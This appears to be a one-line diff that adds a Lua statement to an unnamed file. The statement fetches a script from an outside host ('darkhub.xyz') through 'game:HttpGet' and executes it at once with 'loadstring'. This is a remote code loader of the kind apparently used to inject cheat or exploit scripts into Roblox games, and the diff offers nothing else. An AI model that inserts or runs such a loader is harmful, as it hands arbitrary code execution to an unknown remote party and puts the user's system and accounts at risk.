@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://darkhub.xyz/remote-script.lua", true))()
